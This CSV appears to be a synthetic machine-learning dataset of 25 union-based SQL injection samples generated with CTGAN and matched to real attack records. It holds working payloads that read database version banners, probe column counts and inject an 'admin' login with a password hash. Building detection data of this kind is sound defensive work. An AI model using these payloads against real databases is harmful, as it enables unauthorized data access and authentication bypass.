id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000197,5.537331836293896
CTGAN_000002,attack,union,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",nearest_attack_euclidean,R000270,6.616106249101673
CTGAN_000003,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000112,14.51421605158165
CTGAN_000004,attack,union," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",nearest_attack_euclidean,R000195,6.483915586089623
CTGAN_000005,attack,union," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",nearest_attack_euclidean,R000151,3.912531911750782
CTGAN_000006,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000038,10.812739133347794
CTGAN_000007,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000168,18.13777796921737
CTGAN_000008,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000067,7.6967131320281075
CTGAN_000009,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000036,6.665026063695926
CTGAN_000010,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000255,7.369209812596977
CTGAN_000011,attack,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1",nearest_attack_euclidean,R000027,8.061313211400387
CTGAN_000012,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000212,5.66781454246963
CTGAN_000013,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000064,5.381827026358706
CTGAN_000014,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,5.419123315503902
CTGAN_000015,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000212,5.539481850408121
CTGAN_000016,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000168,19.89197611205265
CTGAN_000017,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000064,6.714951615167144
CTGAN_000018,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,6.171295227622395
CTGAN_000019,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000208,5.569488762002433
CTGAN_000020,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,5.117454261483129
CTGAN_000021,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000197,6.685388501426212
CTGAN_000022,attack,union,"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000298,4.620720854877829
CTGAN_000023,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000134,5.877443910644952
CTGAN_000024,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000067,9.27292351185863
CTGAN_000025,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,5.08266707429586
